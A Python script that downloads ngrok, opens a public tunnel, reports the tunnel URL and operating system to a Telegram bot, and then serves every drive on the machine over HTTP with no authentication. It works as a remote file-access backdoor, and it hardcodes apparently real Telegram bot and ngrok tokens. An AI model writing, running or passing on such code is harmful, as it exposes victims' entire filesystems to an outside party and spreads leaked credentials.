import os
import requests
import subprocess
import zipfile
import time
import platform
import stat
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote

# Telegram Bot Configuration
BOT_TOKEN = "6663901080:AAH3lsdwVI2Q6BEo_gwJUnsjlqLBonzfn0s"
CHAT_ID = "1419030524"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# Send ngrok URL to Telegram
def send_url_to_telegram(public_url, os_info):
    payload = {
        "chat_id": CHAT_ID,
        "text": f"Ngrok Public URL: {public_url}\nOperating System: {os_info}"
    }
    try:
        response = requests.post(TELEGRAM_API_URL, data=payload)
        if response.status_code != 200:
            print(f"Failed to send to Telegram: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

# Download and setup ngrok
def download_ngrok():
    system = platform.system().lower()
    if system == "windows":
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
    elif system == "linux":
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
    elif system == "darwin":
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
    else:
        raise Exception("Unsupported platform")

    local_filename = "ngrok.zip"
    print("Downloading ngrok...")
    with requests.get(url, stream=True) as r:
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    with zipfile.ZipFile(local_filename, 'r') as zip_ref:
        zip_ref.extractall(".")
    os.remove(local_filename)

    if system != "windows":
         os.chmod("ngrok", stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    print("ngrok downloaded and extracted.")

# Configure ngrok auth token
def configure_ngrok_authtoken():
    authtoken = "2pDRBFLOSbsnWjTJoJI8Fy2AWF4_2FLnrWQQc1tv3Qyrpw1z1"
    print("Configuring ngrok authtoken...")
    command = f"./ngrok authtoken {authtoken}" if platform.system().lower() != "windows" else f".\\ngrok.exe authtoken {authtoken}"
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode != 0:
        print(f"Error configuring ngrok: {result.stderr.decode()}")
    else:
        print("Ngrok authtoken configured successfully.")    

# Start ngrok and retrieve public URL
def start_ngrok(port):
    if not os.path.exists("ngrok") and not os.path.exists("ngrok.exe"):
        download_ngrok()
    configure_ngrok_authtoken()

    command = f"./ngrok http {port}" if platform.system().lower() != "windows" else f".\\ngrok.exe http {port}"
    print("Starting ngrok...")
    ngrok_process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    time.sleep(5)

    public_url = None
    try:
        for _ in range(20):
            response = requests.get("http://127.0.0.1:4040/api/tunnels")
            if response.status_code == 200:
                tunnels = response.json().get("tunnels", [])
                if tunnels:
                    public_url = tunnels[0].get("public_url")
                    break
            time.sleep(1)
    except Exception as e:
        print(f"Error fetching public URL: {e}")

    if public_url:
        print(f"Ngrok Public URL: {public_url}")
        os_info = platform.system()
        send_url_to_telegram(public_url, os_info)
    else:
        print("Failed to retrieve ngrok public URL.")
    
    return public_url

# Custom HTTP handler
class MultiDriveRequestHandler(SimpleHTTPRequestHandler):
    def translate_path(self, path):
        path = unquote(path)
        path_parts = path.lstrip('/').split('/', 1)
        if len(path_parts) == 2:
            drive, sub_path = path_parts
        elif len(path_parts) == 1:
            drive, sub_path = path_parts[0], ''
        else:
            return super().translate_path(path)

        system = platform.system().lower()
        if system == "windows":
            drive_letter = f"{drive.upper()}:\\"
            if not os.path.exists(drive_letter):
                return super().translate_path(path)
            return os.path.join(drive_letter, sub_path.replace('/', os.sep))
        else:
            drive_path = f"/{drive}"
            if not os.path.exists(drive_path):
                return super().translate_path(path)
            return os.path.join(drive_path, sub_path.replace('/', os.sep))

# Run HTTP server
def run(server_class=HTTPServer, handler_class=MultiDriveRequestHandler, port=8000):
    public_url = start_ngrok(port)
    if public_url:
        print(f"Public URL: {public_url}")
    else:
        print("Failed to retrieve ngrok public URL.")

    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Serving files from all drives at http://localhost:{port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run()